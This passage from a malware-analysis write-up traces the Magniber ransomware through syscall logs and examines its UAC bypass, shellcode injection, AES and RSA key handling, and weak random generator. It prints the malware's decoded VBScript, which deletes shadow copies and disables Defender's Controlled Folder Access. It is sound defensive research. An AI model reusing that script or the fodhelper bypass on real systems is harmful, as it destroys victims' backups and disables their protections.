	Arg[4] = ptr 0x0000000017c80000 -> L"AppX04g0mbrz4mkc6e879rpf6qk6te730jfv"
	Arg[5] = 0x0000000000000048 = 72

> 17357000+6b5;SYSCALL:0xf(NtClose)
> 17357000+6b5;SYSCALL:0xf(NtClose)
> 17357000+6aa;SYSCALL:0x34(NtDelayExecution)
> 17357000+67e;SYSCALL:0x18(NtAllocateVirtualMemory)
NtAllocateVirtualMemory:
	Arg[0] = 0xffffffffffffffff = 18446744073709551615
	Arg[1] = ptr 0x00000000174bf8c0 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[2] = 0
	Arg[3] = ptr 0x00000000174bf8c8 -> L"J"
	Arg[4] = 0x0df06fa200001000 = 1004425458479009792
	Arg[5] = 0x3548001a00000004 = 3839318794002497540

> 17357000+6c0;SYSCALL:0x55(NtCreateFile)
NtCreateFile:
	Arg[0] = ptr 0x00000000174bf8b0 -> {\xff\xff\xff\xff\xff\xff\xff\xff}
	Arg[1] = ptr 0x0000000000120116 -> {\x00\x00\xf0*\x9a\x02\x00\x00}
	Arg[2] = ptr 0x00000000174bf840 -> L"0"
	Arg[3] = ptr 0x00000000174bf830 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[4] = 0
	Arg[5] = 0x3548001a00000080 = 3839318794002497664
	Arg[6] = 0x7a20201200000002 = 8800068933563449346
	Arg[7] = 0x3478478a00000005 = 3780850545208590341
	Arg[8] = 0x3c506e8200000020 = 4346095145037332512
	Arg[9] = 0

> 17357000+6cb;SYSCALL:0x8(NtWriteFile)
NtWriteFile:
	Arg[0] = 0x0000000000000200 = 512
	Arg[1] = 0
	Arg[2] = 0
	Arg[3] = 0
	Arg[4] = ptr 0x00000000174bf810 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[5] = ptr 0x000000001735cdbf -> {#@~^YQIA}
	Arg[6] = 0x7a2020120000027c = 8800068933563449980
	Arg[7] = 0
	Arg[8] = 0

> 17357000+6b5;SYSCALL:0xf(NtClose)
> 17357000+6aa;SYSCALL:0x34(NtDelayExecution)
> 17352000+cc3;ntdll.RtlCreateProcessParametersEx
RtlCreateProcessParametersEx:
	Arg[0] = ptr 0x00000000174bf8b0 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[1] = ptr 0x00000000174bf7f0 -> U"\??\C:\Windows\System32\cmd.exe"
	Arg[2] = 0
	Arg[3] = 0
	Arg[4] = ptr 0x00000000174bf800 -> U"/c fodhelper.exe"
	Arg[5] = 0
	Arg[6] = 0
	Arg[7] = 0
	Arg[8] = 0
	Arg[9] = 0

> 17357000+67e;SYSCALL:0x18(NtAllocateVirtualMemory)
NtAllocateVirtualMemory:
	Arg[0] = 0xffffffffffffffff = 18446744073709551615
	Arg[1] = ptr 0x00000000174bf8c0 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[2] = 0
	Arg[3] = ptr 0x00000000174bf8b8 -> L" "
	Arg[4] = 0x0000000000001000 = 4096
	Arg[5] = 0x0000000000000004 = 4

> 17357000+841;SYSCALL:0xc8(NtCreateUserProcess)
NtCreateUserProcess:
	Arg[0] = ptr 0x00000000174bf810 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[1] = ptr 0x00000000174bf8c8 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[2] = 0x00000000001fffff = 2097151
	Arg[3] = 0x00000000001fffff = 2097151
	Arg[4] = 0
	Arg[5] = 0
	Arg[6] = 0
	Arg[7] = 0
	Arg[8] = ptr 0x000000000046a610 -> {\xc8\x06\x00\x00\xc8\x06\x00\x00}
	Arg[9] = ptr 0x00000000174bf820 -> L"X"
```

_Complete log available here: [magni.exe](https://gist.github.com/hasherezade/873bb70444cde808011f41e831fffef5) [.](https://gist.github.com/hasherezade/873bb70444cde808011f41e831fffef5) [tag](https://gist.github.com/hasherezade/873bb70444cde808011f41e831fffef5)._

As we can see, at the end the application executed “fodhelper.exe”. Googling for the related strings lead us to the following PoC: [FodhelperBypass.ps1](https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1). As we can see, this system application was used in one of the technique of UAC (User Account Bypass), meant to elevate privileges on Windows. Comparing the strings used by the malware with the ones used in the PoC, as well as their order, and the context of usage, we can find a big overlap that allows to guess that this indeed was a UAC technique used by Magniber.

Then we reach the aforementioned point where the Tiny Tracer is not able to follow the child process, so the execution terminates. At first, I thought to get more luck by running Magniber directly as an Administrator, so that it will skip the process creation, that is a part of its UAC technique. Unfortunately, the UAC is executed regardless the malware is deployed elevated or not. For now we will just continue the analysis with what we have.

### The VBE script

We can see in the log a line referencing a VBScript:

```
L"wscript.exe /B /E:VBScript.Encode ../../Users/Public/vybmaryqycp.mnxu"
```

Indeed this script is dropped (under a pseudo-random name) into C:/Users/Public.

This script is in an encrypted form (VBE), but it can be deobfuscated easily using public tools, i.e. [this one](https://master.ayra.ch/vbs/vbs.aspx). The resulting content:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://hshrzd.wordpress.com/)

|     |     |
| --- | --- |
|  | On Error Resume Next |
|  | Set dd4y336wf97z = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\.\\root\\cimv2") |
|  | Set s1o28iq = dd4y336wf97z.ExecQuery("Select \* From Win32\_ShadowCopy") |
|  | For Each d18706x in s1o28iq |
|  | d18706x.Delete\_ |
|  | Next |
|  | Set c6406r7uh = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\.\\root\\Microsoft\\Windows\\Defender:MSFT\_MpPreference") |
|  | Set jlfze3cy1qjq = c6406r7uh.Methods\_("Set").inParameters.SpawnInstance\_() |
|  | jlfze3cy1qjq.Properties\_.Item("EnableControlledFolderAccess") = 0 |
|  | Set ub7mu3 = c6406r7uh.ExecMethod\_("Set", jlfze3cy1qjq) |
|  | WScript.Quit Err.Number |

[view raw](https://gist.github.com/hasherezade/c93834738a12b1daaa1c06bdb3ea00f2/raw/41b26618a56bf166aacda910fd6e9e1841d00f18/magni_decoded.vbs) [magni\_decoded.vbs](https://gist.github.com/hasherezade/c93834738a12b1daaa1c06bdb3ea00f2#file-magni_decoded-vbs)
hosted with ❤ by [GitHub](https://github.com/)

As we can see, the script is responsible for deleting shadow copies. It also try to change the system settings, in order to expand what files it can access.

After being run, the script is deleted.

### Revealing the second stage shellcode

The inital sample has been terminated, but nevertheless, looking at the symptoms, we can conclude that the ransomware continued its execution: any newly created files with particular extensions keep getting encrypted. Probably the modules got injected into other processes. This observation can be confirmed by looking at the tracelog:

```
[...]
> 15460000+8;SYSCALL:0x26(NtOpenProcess)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 15470000+8;SYSCALL:0x34(NtDelayExecution)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 15490000+8;SYSCALL:0x19(NtQueryInformationProcess)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 154a0000+8;SYSCALL:0x34(NtDelayExecution)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 154b0000+8;SYSCALL:0x34(NtDelayExecution)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 154c0000+8;SYSCALL:0x3a(NtWriteVirtualMemory)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 154d0000+8;SYSCALL:0x34(NtDelayExecution)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 154e0000+8;SYSCALL:0x50(NtProtectVirtualMemory)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 154f0000+8;SYSCALL:0x34(NtDelayExecution)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 15500000+8;SYSCALL:0xc1(NtCreateThreadEx)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 15510000+8;SYSCALL:0x34(NtDelayExecution)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 15530000+8;SYSCALL:0x52(NtResumeThread)
[...]
```

As we can see in the log, the malware was looping over processes, writing to some of them, and executing the written content in a new thread.

In order to reveal where the implanted modules are located, I scanned the system with [HollowsHunter](https://github.com/hasherezade/hollows_hunter) (as an Administrator), with a parameter `/shellc` – to dump all the shellcodes. It turned out that there are multiple processes infected with the same piece of a shellcode. Example:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dump_report-1.png)

Looking at the shellcode strings, we can see that it has a PNG embedded (that is probably the used wallpaper), and as well some HTML and JavaScript:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/12/dumped_shc_strings.png)

The same content of obfuscated JavaScript can be found in Magniber’s README:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/12/readme2.png?w=764)

By dumping all the strings from the shellcode, with the help of [FLOSS](https://github.com/mandiant/flare-floss), we can see some more things hinting that this shellcode belongs to our ransomware:

```
[...]
FLOSS static Unicode strings
\??\
0123456789abcdef
f0123456789
vieijibfm
mstrxoorvdmynkde
documents and settings
appdata
local settings
sample music
sample pictures
sample videos
tor browser
recycle
windows
boot
intel
msocache
perflogs
program files
programdata
recovery
system volume information
winnt
README.html
Users\Public\
wscript.exe /B /E:VBScript.Encode ../../Users/Public/
.mnxu
```

For example, there is a list of well known directories. Such lists are often used by ransomware to skip particular system directories. There are also strings related to the dropped VBE script, and the hardcoded ransomware extension: `vieijibfm`.

Overall, we can confirm with a high level of a confidence that the captured shellcode belongs to Magniber.

We can [run HollowsHunter with option `/kill`](https://github.com/hasherezade/hollows_hunter/wiki#killing-or-suspending-detected-processes) in order to kill all the infected and suspicious processes. To confirm that the ransomware is no longer active in the system, we can make another experiment with creating a new file with one of the attacked extensions. This time the new file won’t get encrypted – meaning all the processes containing Magniber are killed.

## The second stage – Magniber’s core

[3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a](https://www.virustotal.com/gui/file/3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a/detection) – the shellcode#2

* * *

We can make an educated guess that the dumped shellcode is the unpacked Magniber’s core. So, we will continue our tracing from this point.

In order to trace a shellcode, I have to wrap it as an executable. Similarly to the first stage, the shellcode is 64bit.

There are various ways to make a PE out of a shellcode. I decided to simply add it as a new section to the first stage executable, and then redirect the Entry Point there:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/pebear_add_shellc.png?w=754)

_Adding the section with the dumped shellcode (using PE-bear)_

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/pebear_redirect_ep.png?w=886)

_Redirection of Entry Point to the newly added shellcode_

First, I tested if the file executes properly, just by running it as a standalone on my VM. Everything works as expected: files got encrypted, and the wallpaper changes. So, that indeed it is the main part of the ransomware, responsible for encryption of the files.

Then I rolled back the VM, and run it once again – this time via TinyTracer. It turned out to work well. However, the tracing again breaks on the new process creation (used for UAC). It is called via syscall. In contrast to the previous part, this time the call is made from the static code (saved in the PE section, rather than in a dynamically allocated memory), so it is easy to patch it out. I did it just by NOP-in the syscall in PE-bear.

Syscall responsible for executing `NtCreateUserProcess` viewed in PE-bear:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/syscall_to_nop-1.png?w=904)

The same syscall after being NOP-ed out:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/after_nop-1.png?w=902)

Now the tracing proceeds further, to the files encryption.

Just like in the previous case, first I traced it without parameters, to have an overview of what functions are going to be called, and then added relevant entries into `parameters.txt`. Some new function has been added, comparing with the part 1.

```
ntdll;NtQueryDirectoryFile;10
ntdll;NtQueryInformationProcess;5
ntdll;NtSetInformationFile;5
```

The malware keeps running for quite a while (as the execution is slowed down because of the instrumentation with Pin), but we can preview the log in the real time with the help of tools like baretail. By looking at the executed function it seems to be indeed files encryption. Waiting for full system encryption to finish makes no sense, so I decided to break the execution manually and terminate the process.

Fragment of the resulting tracelog:

```
2000;section: [shellc]
19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[1] = 0

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -> {\xbf\xd8\xd2\x82\x06\x00\x00\x00}
	Arg[1] = 0

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -> {\xc5\xf9\xd2\x82\x06\x00\x00\x00}
	Arg[1] = 0

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -> {\x19\xfc\xd2\x82\x06\x00\x00\x00}
	Arg[1] = 0

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -> {m\x06\xd3\x82\x06\x00\x00\x00}
	Arg[1] = 0

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -> {\xb8\x08\xd3\x82\x06\x00\x00\x00}
	Arg[1] = 0

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -> {P\x0a\xd3\x82\x06\x00\x00\x00}
	Arg[1] = 0

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -> {\xc0\x0b\xd3\x82\x06\x00\x00\x00}
	Arg[1] = 0

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -> {E\x0d\xd3\x82\x06\x00\x00\x00}
	Arg[1] = 0

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014fb00 -> {\xc2\x0e\xd3\x82\x06\x00\x00\x00}
	Arg[1] = 0

196aa;SYSCALL:0x34(NtDelayExecution)
1969f;SYSCALL:0x19(NtQueryInformationProcess)
1967e;SYSCALL:0x18(NtAllocateVirtualMemory)
NtAllocateVirtualMemory:
	Arg[0] = 0xffffffffffffffff = 18446744073709551615
	Arg[1] = ptr 0x000000000014fb08 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[2] = 0
	Arg[3] = ptr 0x000000000014fb00 -> {\x10\x00\x00\x00\x00\x00\x00\x00}
	Arg[4] = 0x14801af200001000 = 1477210304461934592
	Arg[5] = 0x14d8106a00000004 = 1501968523180638212

196d6;SYSCALL:0x33(NtOpenFile)
NtOpenFile:
	Arg[0] = ptr 0x000000000014faf8 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[1] = 0x0000000000100080 = 1048704
	Arg[2] = ptr 0x000000000014fa90 -> L"0"
	Arg[3] = ptr 0x000000000014fa58 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[4] = 0x14801af200000001 = 1477210304461930497
	Arg[5] = 0x14d8106a00000021 = 1501968523180638241
[...]
```

By looking at the tracelog, we can clearly see fragments that resemble file encryption. Relevant fragments:

```
1972e;SYSCALL:0x11(NtQueryInformationFile)
196c0;SYSCALL:0x55(NtCreateFile)
NtCreateFile:
	Arg[0] = ptr 0x000000000014ef08 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[1] = 0x0000000000120116 = 1179926
	Arg[2] = ptr 0x000000000014eb88 -> L"0"
	Arg[3] = ptr 0x000000000014eae0 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[4] = 0
	Arg[5] = 0x0000000000000080 = 128
	Arg[6] = 0x0000000000000003 = 3
	Arg[7] = 0x0000000000000001 = 1
	Arg[8] = 0x0000000000000120 = 288
	Arg[9] = 0

1967e;SYSCALL:0x18(NtAllocateVirtualMemory)
NtAllocateVirtualMemory:
	Arg[0] = 0xffffffffffffffff = 18446744073709551615
	Arg[1] = ptr 0x000000000014ea78 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[2] = 0
	Arg[3] = ptr 0x000000000014eac8 -> {\x00\x01\x10\x00\x00\x00\x00\x00}
	Arg[4] = 0x0000000000001000 = 4096
	Arg[5] = 0x0000000000000004 = 4

1967e;SYSCALL:0x18(NtAllocateVirtualMemory)
NtAllocateVirtualMemory:
	Arg[0] = 0xffffffffffffffff = 18446744073709551615
	Arg[1] = ptr 0x000000000014eaa0 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[2] = 0
	Arg[3] = ptr 0x000000000014ea68 -> {\x00\x01\x10\x00\x00\x00\x00\x00}
	Arg[4] = 0x0000000000001000 = 4096
	Arg[5] = 0x0000000000000004 = 4

196e1;SYSCALL:0x6(NtReadFile)
196cb;SYSCALL:0x8(NtWriteFile)
NtWriteFile:
	Arg[0] = 0x0000000000000470 = 1136
	Arg[1] = 0
	Arg[2] = 0
	Arg[3] = 0
	Arg[4] = ptr 0x000000000014ea38 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[5] = ptr 0x00000000163c0000 -> {\x01`\xa4\x13H\xc7w.}
	Arg[6] = 0x00000000000005a0 = 1440
	Arg[7] = 0
	Arg[8] = 0

1967e;SYSCALL:0x18(NtAllocateVirtualMemory)
NtAllocateVirtualMemory:
	Arg[0] = 0xffffffffffffffff = 18446744073709551615
	Arg[1] = ptr 0x000000000014ea70 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[2] = 0
	Arg[3] = ptr 0x000000000014eaa8 -> {\x00\x01\x00\x00\x00\x00\x00\x00}
	Arg[4] = 0x0000000000001000 = 4096
	Arg[5] = 0x0000000000000004 = 4

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014e890 -> {\x16)\xb4\xb4\x05C\xd0\x92}
	Arg[1] = 0

[...]

19694;SYSCALL:0x31(NtQueryPerformanceCounter)
NtQueryPerformanceCounter:
	Arg[0] = ptr 0x000000000014e890 -> {h\xa1\xe1\x9e\x04\x00\x00\x00}
	Arg[1] = 0

196cb;SYSCALL:0x8(NtWriteFile)
NtWriteFile:
	Arg[0] = 0x0000000000000470 = 1136
	Arg[1] = 0
	Arg[2] = 0
	Arg[3] = 0
	Arg[4] = ptr 0x000000000014ea38 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[5] = ptr 0x0000000013990000 -> {\xe4|\xfa\x96\xeb!\x89\xea}
	Arg[6] = 0x0000000000000100 = 256
	Arg[7] = 0
	Arg[8] = 0

19689;SYSCALL:0x1e(NtFreeVirtualMemory)
196b5;SYSCALL:0xf(NtClose)
196b5;SYSCALL:0xf(NtClose)
196b5;SYSCALL:0xf(NtClose)
```

Files are repeatedly read, and then written to. We can see a heavily use of the function `NtQueryPerformanceCounter` in each such round. This function is a low-level equivalent of `QueryPerformanceCounter`, which MSDN explains in the following way:

> Retrieves the current value of the performance counter, which is a high resolution (<1us) time stamp that can be used for time-interval measurements.

I suspect that this ransomware uses it as a source of entropy, but we will see if this assumption is valid using static analysis…

## Going deeper…

Having the tags generated by Tiny Tracer, we can apply them into IDA, or Ghidra, using the tools mentioned [here](https://github.com/hasherezade/tiny_tracer/wiki/Using-the-TAGs-with-disassemblers-and-debuggers).

I loaded the Tags into IDA, using IFL plugin, and renamed the functions with syscalls accordingly to what system function do they execute.

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/tags_applied.png)

Now we can follow the interesting functions by their references, to see the whole code context in which they are executed.

When we come in contact with a new ransomware, often the first questions we ask is, if it is decryptable, and what is the scale of the damage done. In order to know it, we will analyze what algorithm is used, how the keys are generated, how the keys are protected, etc.

### Encryption algorithm

The function responsible for file encryption can be found by following the references of `NtReadFile`.

Between the reads and the writes into a file (`NtReadFile` and `NtWriteFile`) we can find how the read chunk is being encrypted:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/file_enc_algo.png)

Most of the ransomware authors use AES for file encryption. Magniber follows this trend. But the intresting part is the implementation. Instead of using a common implementation that works at a higher abstraction level (and i.e. leverage some of the known libraries, or Windows Crypto API as the old Magniber did) authors made a bold choice to go for a low-level one, via the (relatively) new Intel instructions for AES encryption ( [AES-NI extension](https://www.intel.com/content/www/us/en/developer/articles/technical/advanced-encryption-standard-instructions-aes-ni.html)). Using AES-NI allows for much faster encryption, but the cost of is to drop the backward compatibility with older machines that don’t support it. As well it makes the used algorithm obvious at first look at the assembly, which is not neccessarily beneficial from the malware author’s perspective.

First, the key is initialized by the function that also has AES-NI based implementation (referenced as `aes_low_level_keygen`):

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/init_key.png)

We can see the AES-NI instruction [AESKEYGENASSIST](https://www.felixcloutier.com/x86/aeskeygenassist) used in order to prepare the AES context.

Then we can see how the next chunk of data is loaded, and encrypted by consecutive AES rounds, using the instruction [AESENC](https://www.felixcloutier.com/x86/aesenc). At the end, an instruction [AESENCLAST](https://www.felixcloutier.com/x86/aesenclast) is used to finalize the encryption.

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/aes_round.png)

### AES key generation

The next important point is to check how the AES key gets generated.

#### The random generator

By observing the flow earlier on, I started to suspect that the function `NtQueryPerformanceCounter` is used as a source of entropy, to initialize all sort of pseudorandom variables. Indeed, this native function is incorporated in a function made for generating random values:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/make_pseurorandom.png?w=779)

The function has the following prototype, allowing to supply the range from which the random number should be selected:

```
__int64 __fastcall make_pseudo_random(unsigned int min, unsigned int max);
```

The function comes with a table of 100 pseudorandom DWORDs. Then, a simple algorithm making use of `NtQueryPerformanceCounter` is executed, in order to select a random index from this table. Basing on the value from the table at this index, and the given min and max values, the final pseudorandom value is calculated. In case if the calculated value failed to fit in the range, a new attempt is made recursively.

The interesting point at this moment is, that the random value is selected in fact from the hardcoded table. So, if we consider that our random value must be of size 1 byte, then, instead of the typical range of 255 options to select from, the range of options narrows down to 100 which is the table size.

Note, that we can see some general similarities with the analogous function from the old edition of Magniber, yet the implementation differs:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dga_part0.png)

_The random generator used in the old Magniber (2017)_

Yet, in the old version this random generator is not used to derive the keys.

We must note that neither `GetTickCount,` nor `NtQueryPerformanceCounter` is a cryptographicaly secure source of entropy. In both cases, the values generated are incremental, not random, and relative to the system start. Yet, `GetTickCount` has lower resolution, so finding the initial value that started the series (seed) is much easier.

### Generating AES key and IV

The aforementioned function is used in multiple places in the code, but what interests us the most at this point, is that is is used for the generation of AES key and IV used for files encryption:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/make_aes_key-1.png?w=685)

Both AES key and IV are 16 bytes long, which makes it AES 128.

The range from which the values are selected is 1 to 254, which is yet more narrow than typical 0 to 255.

I conducted and experiment by hooking the function, and checking what is the possible set of the values of one pseudorandom byte from this range. It turns out, that this set has only 67 elements (unlike 255, as it would be for the full BYTE range):

```
{ 5, 9, f, 13, 15, 1d, 20, 23, 2f, 31, 33, 35, 37, 39, 3d, 3f, 41, 45, 47, 49, 4b, 55, 59, 5b, 5d, 61, 62, 63, 64, 69, 6b, 6c, 6f, 72, 79, 7e, 7f, 81, 83, 87, 8f, 90, 91, 93, 97, 99, 9d, 9f, a1, a7, ab, af, b3, c1, c3, cb, cd, d5, e1, e5, e7, e9, eb, f3, f4, f7, fb }
```

So, in order to generate the key, we are selecting 16 values out of the 67 elements set, which gives 67^16 permutations. It gives 1.6489096e+29. So, although the key is a bit weakened, it is still impossible to brutforce.

Generated AES key and IV:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/maybe_key.png)![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/maybe_iv.png)

We can further confirm that the generated key was used to initialize the AES context:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/init_aes_key-1.png)

By supplying the dumped data to [CyberChef](https://gchq.github.io/CyberChef/), we can confirm that it is a valid implementation of AES 128, and the used mode is CBC .

The same cipher was used by the old Magniber’s edition: yet, its implementation, as well as key generation was very different.

### Protecting AES key and IV

Even if the AES key and IV have been generated properly, there is still one point of a possible weakness, and that is about how they are protected.

After the encrypted chunks of the file are being written, there is yet another call to `NtWriteFile`. This time it is used to save the encrypted AES key and IV.

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/asym_crypto.png)

The algorithm used to protect them seems to be a custom implementation of RSA (we will verify its correctness further on).

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/protect_key_and_iv-1.png?w=596)

_The generated key and IV are stored together in a buffer, and then passed to the asymmetric crypto function._

The ransomware uses attacker’s public key that is hardcoded in the binary:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/hardcoded_rsa_key.png?w=621)

The public key is copied and passed to the function:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/load_master_key.png?w=620)

Once the buffer containing the AES key and IV is passed to the function, the random padding is appended to it:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/asymmetric_crypto-4.png)

Inside the function denoted as `apply_assymmetric_crypto` we can see some [building blocks typical for RSA](https://www.dcode.fr/rsa-cipher):

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/rsa_inside1.png)

The prepared data, containing the AES key and IV are encrypted, and then copied to the output buffer.

### Verifying the RSA implementation

Verifying the RSA implementation by static analysis may be a laborious tasks. So, I am gonna use a shortcut. I will dump the data involved in the encryption process: n – key, e – exponent, and m – message, and repeat the encryption with the help of public tools, where I am sure the RSA has been implemented correctly. If I can obtain the same ciphertext, it means that the implementation in the malware is valid.

I hooked the function `apply_assymmetric_crypto` and dumped the elements listed below. Full code of the loader can be found [here](https://gist.github.com/hasherezade/6662b534d08786ddf1ba73457d4b94fe).

_Mind the fact that the order of bytes in the dumped buffer needs to be reversed. This can be done conveniently with CyberChief. Example [here](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Reverse('Byte')To_Hex('Space',0)&input=NjAgMTAgNTUgM0IgQ0MgRDAgRjIgN0QgMEYgMzQgNUUgRUUgMDIgQUMgMUEgMzIgMTYgNjQgNjkgRjcgRDYgNUYgNkUgNzMgRjEgRTEgRTYgQjUgNzggNjkgNDEgQjUgQzUgREEgRUMgRTYgRDAgOEEgRTUgM0MgOEMgQTAgQjYgQTYgMUMgMzMgNjQgREIgN0UgQTYgREIgRUMgNzggRjAgMzkgQTcgNTcgRjMgMTYgREEgNkIgN0YgMDUgNDcgNDMgQ0YgMUYgRDUgNDggOTggRkEgOUEgNEIgNzcgODcgRUIgRUYgRUYgMTIgQ0YgQUMgMDcgQkIgM0IgNDMgOEQgNzkgMDEgRjkgNkQgNjcgMEQgMzMgNzUgNDcgQ0QgMEUgQTIgNDkgM0UgOTEgQzUgODEgMEUgNkYgRjEgQkUgOTYgQTMgMzMgNEUgMUMgMDQgOUIgMkUgQjEgNzIgQUEgRjggNTMgRjQgMTYgNUEgQjggNEUgQTEgMjMgN0YgQTAgMTcgMjUgNzAgMkMgODkgMUMgOTAgMjYgQzIgN0MgMDUgRDYgODIgRTggRDYgMTMgRTYgNDIgMDkgRUIgNkYgRDggQkYgN0MgRjEgMDMgREIgNDIgOUYgNjUgMDIgMEUgRDkgODkgNTggRUIgMkEgNjIgNEMgRjkgMjcgMUUgQ0EgMDEgNkMgQTggRTEgODcgNEEgOTAgRDIgOEEgNjcgQ0UgOTcgMjUgNUIgRDEgMEEgNUIgQkMgM0MgNDIgMEYgNzkgMTIgNEMgOUEgMzQgOTQgRUYgNTggNTcgMTUgRDggRDUgNzAgMjMgODggMkUgRjEgNDggRUQgQTIgMjAgNjggMEQgODUgMEEgNUIgMDkgQUQgMDAgMjQgNTIgOTIgOUQgRTAgMUEgQzkgRjIgRTMgNDIgREYgNDkgOTAgRjIgMUMgQjYgNkEgOTIgRUYgODQgMUUgMDAgREIgQjcgRTggODggMjQgMEIgNEIgODIgQjAgMTkgMkQgMTE)._

RSA key components:

**e =**`10001`

**n** = `c6 c2 f7 3c 03 46 3d 1b 4e 3e a9 03 bb 4d 3a 6c cb f3 88 cf 53 5b 43 cb 75 17 97 8a 73 c6 88 01 46 ba cd 65 69 bf ef 20 f0 0a b2 a7 99 6d 3c 87 f1 a5 21 94 c1 53 1f 8c b6 69 3d 7e d0 d4 a4 ba 63 d1 37 8e 0f af 4b b5 71 4e 58 d0 7e 64 a0 2f 4d 16 43 fa 9f 51 19 b3 99 5d 7c 7d 66 e0 62 06 d3 cd 1c 63 76 5e 25 64 84 a1 dc 1e 09 84 e6 76 e3 48 aa a7 c3 66 e2 28 9f 3c 81 64 5b 6a 04 3d 92 e7 bf e9 65 39 c3 f6 53 fa 70 96 11 15 a5 50 75 76 e7 31 94 53 7c e6 5a bb 75 19 7a 6f 21 3b e0 db 42 cb 9f c7 d2 04 80 70 e8 83 d5 35 1e a7 40 ef d6 42 8c 2e 5e de f0 c9 51 fe 80 0f 6b 0b 16 13 3e 2b f1 e2 12 d9 58 8b 18 47 77 b2 2f 83 53 d6 a9 74 99 18 e2 ec 14 36 d1 6a bd 5c 00 77 ae 7f 52 26 7b e9 04 02 a8 e1 12 53 50 6c b8 34 2d da 11 bd c6 c4 b7 d9 19 02 16 9b 32 b4 1f 15`

Content to be encrypted: random AES key + IV (hilighted) + padding:

